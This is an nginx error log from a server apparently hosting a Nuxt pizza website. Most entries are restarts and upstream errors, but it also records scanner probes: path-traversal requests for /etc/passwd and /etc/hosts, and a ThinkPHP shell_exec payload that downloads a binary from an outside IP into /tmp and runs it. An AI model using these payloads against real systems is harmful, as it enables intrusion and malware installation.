2023/09/16 11:57:24 [notice] 1#1: using the "epoll" event method
2023/09/16 11:57:24 [notice] 1#1: nginx/1.25.2
2023/09/16 11:57:24 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 11:57:24 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 11:57:24 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 11:57:24 [notice] 1#1: start worker processes
2023/09/16 11:57:24 [notice] 1#1: start worker process 22
2023/09/16 11:57:51 [error] 22#22: *2 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", host: "85.31.238.178"
2023/09/16 11:58:31 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 11:58:31 [notice] 22#22: gracefully shutting down
2023/09/16 12:02:53 [notice] 1#1: using the "epoll" event method
2023/09/16 12:02:53 [notice] 1#1: nginx/1.25.2
2023/09/16 12:02:53 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:02:53 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:02:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:02:53 [notice] 1#1: start worker processes
2023/09/16 12:02:53 [notice] 1#1: start worker process 22
2023/09/16 12:02:57 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", host: "85.31.238.178"
2023/09/16 12:03:44 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:03:44 [notice] 22#22: gracefully shutting down
2023/09/16 12:06:40 [notice] 1#1: using the "epoll" event method
2023/09/16 12:06:40 [notice] 1#1: nginx/1.25.2
2023/09/16 12:06:40 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:06:40 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:06:40 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:06:40 [notice] 1#1: start worker processes
2023/09/16 12:06:40 [notice] 1#1: start worker process 22
2023/09/16 12:06:54 [error] 22#22: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: your-domain.com, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:06:54 [warn] 22#22: *2 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: your-domain.com, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:06:54 [error] 22#22: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: your-domain.com, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:06:54 [warn] 22#22: *2 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: your-domain.com, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:07:52 [info] 22#22: *1 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/16 12:07:52 [info] 22#22: *3 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/16 12:08:05 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:08:05 [notice] 22#22: gracefully shutting down
2023/09/16 12:08:05 [notice] 22#22: exiting
2023/09/16 12:08:05 [notice] 22#22: exit
2023/09/16 12:08:05 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/16 12:08:05 [notice] 1#1: worker process 22 exited with code 0
2023/09/16 12:08:05 [notice] 1#1: exit
2023/09/16 12:08:15 [notice] 1#1: using the "epoll" event method
2023/09/16 12:08:15 [notice] 1#1: nginx/1.25.2
2023/09/16 12:08:15 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:08:15 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:08:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:08:15 [notice] 1#1: start worker processes
2023/09/16 12:08:15 [notice] 1#1: start worker process 22
2023/09/16 12:08:32 [error] 22#22: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:08:32 [warn] 22#22: *2 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:08:32 [error] 22#22: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:08:32 [warn] 22#22: *2 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:09:32 [info] 22#22: *1 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/16 12:18:59 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:18:59 [notice] 22#22: gracefully shutting down
2023/09/16 12:18:59 [notice] 22#22: exiting
2023/09/16 12:18:59 [notice] 22#22: exit
2023/09/16 12:18:59 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/16 12:18:59 [notice] 1#1: worker process 22 exited with code 0
2023/09/16 12:18:59 [notice] 1#1: exit
2023/09/16 12:19:05 [notice] 1#1: using the "epoll" event method
2023/09/16 12:19:05 [notice] 1#1: nginx/1.25.2
2023/09/16 12:19:05 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:19:05 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:19:05 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:19:05 [notice] 1#1: start worker processes
2023/09/16 12:19:05 [notice] 1#1: start worker process 22
2023/09/16 12:19:41 [error] 22#22: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:19:41 [warn] 22#22: *1 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:19:41 [error] 22#22: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:19:41 [warn] 22#22: *1 upstream server temporarily disabled while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "85.31.238.178"
2023/09/16 12:19:41 [error] 22#22: *1 no live upstreams while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://localhost/", host: "85.31.238.178"
2023/09/16 12:19:42 [error] 22#22: *1 no live upstreams while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://localhost/", host: "85.31.238.178"
2023/09/16 12:19:43 [error] 22#22: *1 no live upstreams while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://localhost/", host: "85.31.238.178"
2023/09/16 12:19:49 [error] 22#22: *1 no live upstreams while connecting to upstream, client: 103.77.186.50, server: _, request: "GET / HTTP/1.1", upstream: "http://localhost/", host: "85.31.238.178"
2023/09/16 12:19:52 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:19:52 [notice] 22#22: gracefully shutting down
2023/09/16 12:20:22 [notice] 1#1: using the "epoll" event method
2023/09/16 12:20:22 [notice] 1#1: nginx/1.25.2
2023/09/16 12:20:22 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:20:22 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:20:22 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:20:22 [notice] 1#1: start worker processes
2023/09/16 12:20:22 [notice] 1#1: start worker process 22
2023/09/16 12:20:28 [warn] 22#22: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.4ab82f90.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.4ab82f90.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:20:29 [warn] 22#22: *9 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:21:18 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:21:18 [notice] 22#22: gracefully shutting down
2023/09/16 12:21:18 [notice] 22#22: exiting
2023/09/16 12:21:18 [notice] 22#22: exit
2023/09/16 12:21:18 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/16 12:21:18 [notice] 1#1: worker process 22 exited with code 0
2023/09/16 12:21:18 [notice] 1#1: exit
2023/09/16 12:21:25 [notice] 1#1: using the "epoll" event method
2023/09/16 12:21:25 [notice] 1#1: nginx/1.25.2
2023/09/16 12:21:25 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:21:25 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:21:25 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:21:25 [notice] 1#1: start worker processes
2023/09/16 12:21:25 [notice] 1#1: start worker process 22
2023/09/16 12:22:30 [info] 22#22: *3 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/16 12:23:29 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:23:29 [notice] 22#22: gracefully shutting down
2023/09/16 12:23:29 [notice] 22#22: exiting
2023/09/16 12:23:29 [notice] 22#22: exit
2023/09/16 12:23:29 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/16 12:23:29 [notice] 1#1: worker process 22 exited with code 0
2023/09/16 12:23:29 [notice] 1#1: exit
2023/09/16 12:24:08 [notice] 1#1: using the "epoll" event method
2023/09/16 12:24:08 [notice] 1#1: nginx/1.25.2
2023/09/16 12:24:08 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:24:08 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:24:08 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:24:08 [notice] 1#1: start worker processes
2023/09/16 12:24:08 [notice] 1#1: start worker process 22
2023/09/16 12:24:56 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/16 12:24:56 [notice] 22#22: gracefully shutting down
2023/09/16 12:25:37 [notice] 1#1: using the "epoll" event method
2023/09/16 12:25:37 [notice] 1#1: nginx/1.25.2
2023/09/16 12:25:37 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/16 12:25:37 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/16 12:25:37 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/16 12:25:37 [notice] 1#1: start worker processes
2023/09/16 12:25:37 [notice] 1#1: start worker process 22
2023/09/16 12:26:02 [warn] 22#22: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/entry.4ab82f90.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.4ab82f90.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:26:03 [warn] 22#22: *8 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:33:34 [warn] 22#22: *38 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:33:34 [warn] 22#22: *40 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 12:34:44 [warn] 22#22: *42 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/5/00/0000000005 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/?name=Pranjal"
2023/09/16 12:34:44 [warn] 22#22: *31 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/6/00/0000000006 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/?name=Pranjal"
2023/09/16 12:42:56 [info] 22#22: *181 client timed out (110: Connection timed out) while waiting for request, client: 125.21.249.98, server: 0.0.0.0:80
2023/09/16 14:44:17 [warn] 22#22: *184 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/7/00/0000000007 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 14:45:16 [info] 22#22: *183 client timed out (110: Connection timed out) while waiting for request, client: 125.21.249.98, server: 0.0.0.0:80
2023/09/16 15:21:05 [warn] 22#22: *188 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/8/00/0000000008 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/entry.b2e094b3.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.b2e094b3.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/16 18:38:44 [info] 22#22: *223 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùüÙ‰)gNZ{›Êˆ"
2023/09/16 18:38:44 [info] 22#22: *225 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù›Í˝Óﬁ~ò¿ã2Õ2æcŸ¥Ad4Ωá∂CILL„qí  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:38:45 [info] 22#22: *229 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùƒúa÷VVc~wÒ?d?<≈yev”ºK¢∫G7ÈÕWêô  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:38:45 [info] 22#22: *230 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùæÁúNó‘ÔÕáËÕm¯ºÇ VøbÏxb·ù_˘{Û  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:38:45 [info] 22#22: *231 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùH"
2023/09/16 18:38:59 [info] 22#22: *227 client prematurely closed connection while reading client request headers, client: 62.122.184.251, server: _, request: "GET /login HTTP/1.1", host: "85.31.238.178:80"
2023/09/16 18:39:08 [info] 22#22: *243 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù?hO z‘frıödbí›‹dÄ’G≥≥?w	È£jö  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:39:08 [info] 22#22: *244 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù™–[˙ÙG&∞ÆâÍåç¨E{pœ Eﬁü0$50	à2¨⁄  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:39:08 [info] 22#22: *245 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùt(ÄË>·uµÑ"
2023/09/16 18:39:18 [info] 22#22: *247 client 62.122.184.251 closed keepalive connection
2023/09/16 18:39:25 [info] 22#22: *249 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùúW¡ô¯xRË*≠™lA*ô¿•1-39¶vAS˘r ∂  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:39:32 [info] 22#22: *258 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùS´ﬁè∏∫Æ:\hv8"ÇÓ!ßﬂË8å§ñ3·˜  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:39:53 [info] 22#22: *261 client 62.122.184.251 closed keepalive connection
2023/09/16 18:40:00 [info] 22#22: *271 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù¬∏cπ‰ˇ*)«PÎwÛ5ErMJ·¶(–-·'π˙Ÿf•  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:40:22 [info] 22#22: *215 client sent invalid header line: "rand_key: 404.519" while reading client request headers, client: 62.122.184.251, server: _, request: "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1", host: "85.31.238.178"
2023/09/16 18:40:24 [info] 22#22: *282 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù(Ô)p_5eœì¿≥±·π8P¶˙$x€cÁÆ§Lv  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 18:40:51 [info] 22#22: *215 client sent invalid header line: "rand_key: 500.3" while reading client request headers, client: 62.122.184.251, server: _, request: "POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1", host: "85.31.238.178"
2023/09/16 18:40:53 [info] 22#22: *226 client sent invalid request while reading client request line, client: 62.122.184.251, server: _, request: "GET /images//////////////////../../../../../../../../etc/passwd HTTP/1.1"
2023/09/16 18:40:54 [info] 22#22: *292 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù›±©ç…Øo|(I4Y>îOBˇ˝0ö˙“(ßœ∫Æ„Ã´  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 20:02:16 [info] 22#22: *318 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: "root"
2023/09/16 20:02:16 [info] 22#22: *319 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù" å»ïâe±∆¬—!6ÛáaÛWË~@>ÿÒFs(  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 20:02:19 [info] 22#22: *320 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùù#pº·$ñÆdt;c"
2023/09/16 20:02:24 [info] 22#22: *331 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ù/ˆrÕKﬁ∫bÁ¢ùå˚B√ªnÚô"+¨ö9.Ç∞P(  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 20:02:46 [info] 22#22: *311 client sent invalid request while reading client request line, client: 62.122.184.251, server: _, request: "GET /css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1"
2023/09/16 20:02:46 [info] 22#22: *306 client sent invalid request while reading client request line, client: 62.122.184.251, server: _, request: "GET /loginLess/../../etc/passwd HTTP/1.1"
2023/09/16 20:02:51 [info] 22#22: *304 client sent invalid request while reading client request line, client: 62.122.184.251, server: _, request: "GET /login/../../../etc/passwd HTTP/1.1"
2023/09/16 20:02:54 [info] 22#22: *362 client sent invalid request while reading client request line, client: 62.122.184.251, server: _, request: "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"
2023/09/16 20:02:59 [info] 22#22: *393 client sent invalid method while reading client request line, client: 62.122.184.251, server: _, request: " °  ùÚWbÆ7§t∑ª¢eJê‘ﬁÑq0ÂÂg‹~h∂Ó∂j—  *¿+¿/ ûÃ©Ã®Ã™¿"
2023/09/16 20:29:59 [info] 22#22: *401 client 36.68.53.21 closed keepalive connection
2023/09/16 21:42:56 [info] 22#22: *403 recv() failed (104: Connection reset by peer) while waiting for request, client: 167.94.145.54, server: 0.0.0.0:80
2023/09/16 21:42:57 [info] 22#22: *404 client 167.94.145.54 closed keepalive connection (104: Connection reset by peer)
2023/09/16 21:42:57 [info] 22#22: *406 client 167.94.145.54 closed keepalive connection
2023/09/16 21:42:57 [info] 22#22: *408 client sent invalid request while reading client request line, client: 167.94.145.54, server: _, request: "PRI * HTTP/2.0"
2023/09/16 21:42:57 [info] 22#22: *408 recv() failed (104: Connection reset by peer) while reading client request line, client: 167.94.145.54, server: _, request: "PRI * HTTP/2.0"
2023/09/16 21:52:32 [info] 22#22: *411 client closed connection while waiting for request, client: 169.239.11.231, server: 0.0.0.0:80
2023/09/16 21:52:32 [info] 22#22: *412 client 169.239.11.231 closed keepalive connection
2023/09/16 21:52:34 [info] 22#22: *414 client 169.239.11.231 closed keepalive connection
2023/09/16 23:24:07 [info] 22#22: *416 client sent HTTP/1.1 request without "Host" header while reading client request headers, client: 218.32.249.127, server: _, request: "GET / HTTP/1.1"
2023/09/16 23:24:18 [info] 22#22: *417 client sent HTTP/1.1 request without "Host" header while reading client request headers, client: 218.32.249.127, server: _, request: "GET / HTTP/1.1"
2023/09/17 00:12:31 [info] 22#22: *418 client 218.32.249.127 closed keepalive connection (104: Connection reset by peer)
2023/09/17 01:33:02 [info] 22#22: *420 client closed connection while waiting for request, client: 218.32.249.127, server: 0.0.0.0:80
2023/09/17 01:37:49 [info] 22#22: *421 client closed connection while waiting for request, client: 103.169.214.130, server: 0.0.0.0:80
2023/09/17 01:44:34 [info] 22#22: *422 client 157.230.143.176 closed keepalive connection
2023/09/17 02:23:10 [info] 22#22: *424 client 103.149.192.60 closed keepalive connection
2023/09/17 03:29:24 [info] 22#22: *426 client sent invalid method while reading client request line, client: 94.242.61.242, server: _, request: " Ó  Í™©/g|FıI¡6à∂àÖHUœ/ıg¢QeïFœ·…"Q f¨∑¥L…E`‹û?`ˇ*÷9ßå:b+ë◊‡^∆ëaqŸ &¿+¿/¿,¿0Ã©Ã®¿	¿¿"
2023/09/17 03:29:24 [info] 22#22: *426 recv() failed (104: Connection reset by peer) while reading client request line, client: 94.242.61.242, server: _, request: " Ó  Í™©/g|FıI¡6à∂àÖHUœ/ıg¢QeïFœ·…"Q f¨∑¥L…E`‹û?`ˇ*÷9ßå:b+ë◊‡^∆ëaqŸ &¿+¿/¿,¿0Ã©Ã®¿	¿¿"
2023/09/17 03:29:24 [info] 22#22: *427 client sent invalid host header while reading client request headers, client: 94.242.61.242, server: _, request: "GET / HTTP/1.1", host: ""
2023/09/17 03:29:24 [info] 22#22: *427 recv() failed (104: Connection reset by peer) while reading client request headers, client: 94.242.61.242, server: _, request: "GET / HTTP/1.1", host: ""
2023/09/17 03:29:25 [info] 22#22: *430 client sent invalid request while reading client request line, client: 94.242.61.242, server: _, request: "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1"
2023/09/17 03:29:25 [info] 22#22: *430 recv() failed (104: Connection reset by peer) while reading client request line, client: 94.242.61.242, server: _, request: "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1"
2023/09/17 03:44:43 [info] 22#22: *455 client 20.150.217.150 closed keepalive connection
2023/09/17 06:09:42 [info] 22#22: *457 client sent invalid request while reading client request line, client: 101.13.1.43, server: _, request: "GET /index.php?s=/index/	hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://194.38.21.42/bins/x86_64 -O /tmp/.dope chmod 777 /tmp/.dope; /tmp/.dope selfrep.x86' HTTP/1.1"
2023/09/17 06:09:42 [info] 22#22: *458 client closed connection while waiting for request, client: 101.13.1.43, server: 0.0.0.0:80
2023/09/17 07:51:52 [info] 22#22: *459 client 194.55.224.254 closed keepalive connection
2023/09/17 08:16:53 [info] 22#22: *461 client 46.163.32.30 closed keepalive connection
2023/09/17 08:58:25 [error] 22#22: *463 connect() failed (111: Connection refused) while connecting to upstream, client: 179.109.193.201, server: _, request: "GET / HTTP/1.0", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178"
2023/09/17 09:06:45 [warn] 22#22: *466 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/9/00/0000000009 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/entry.f6f67331.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.f6f67331.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 09:06:46 [warn] 22#22: *472 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/0/01/0000000010 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 09:13:42 [info] 22#22: *488 client closed connection while waiting for request, client: 62.133.46.137, server: 0.0.0.0:80
2023/09/17 10:21:34 [info] 22#22: *491 client 41.13.28.22 closed keepalive connection
2023/09/17 10:21:43 [info] 22#22: *489 client closed connection while waiting for request, client: 41.13.28.22, server: 0.0.0.0:80
2023/09/17 10:21:44 [info] 22#22: *490 client closed connection while waiting for request, client: 41.13.28.22, server: 0.0.0.0:80
2023/09/17 11:02:18 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 11:02:18 [notice] 22#22: gracefully shutting down
2023/09/17 11:02:18 [notice] 22#22: exiting
2023/09/17 11:02:18 [notice] 22#22: exit
2023/09/17 11:02:18 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/17 11:02:18 [notice] 1#1: worker process 22 exited with code 0
2023/09/17 11:02:18 [notice] 1#1: exit
2023/09/17 11:50:32 [notice] 1#1: using the "epoll" event method
2023/09/17 11:50:32 [notice] 1#1: nginx/1.25.2
2023/09/17 11:50:32 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 11:50:32 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 11:50:32 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 11:50:32 [notice] 1#1: start worker processes
2023/09/17 11:50:32 [notice] 1#1: start worker process 22
2023/09/17 11:53:57 [info] 22#22: *10 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.10, server: 0.0.0.0:80
2023/09/17 11:59:28 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 11:59:28 [notice] 22#22: gracefully shutting down
2023/09/17 11:59:28 [notice] 22#22: exiting
2023/09/17 11:59:28 [notice] 22#22: exit
2023/09/17 11:59:28 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/17 11:59:28 [notice] 1#1: worker process 22 exited with code 0
2023/09/17 11:59:28 [notice] 1#1: exit
2023/09/17 12:17:10 [notice] 1#1: using the "epoll" event method
2023/09/17 12:17:10 [notice] 1#1: nginx/1.25.2
2023/09/17 12:17:10 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 12:17:10 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 12:17:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 12:17:10 [notice] 1#1: start worker processes
2023/09/17 12:17:10 [notice] 1#1: start worker process 23
2023/09/17 12:19:00 [info] 23#23: *2 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.10, server: 0.0.0.0:80
2023/09/17 12:21:57 [warn] 23#23: *6 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.f6f67331.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.f6f67331.js", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
2023/09/17 12:21:58 [warn] 23#23: *15 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
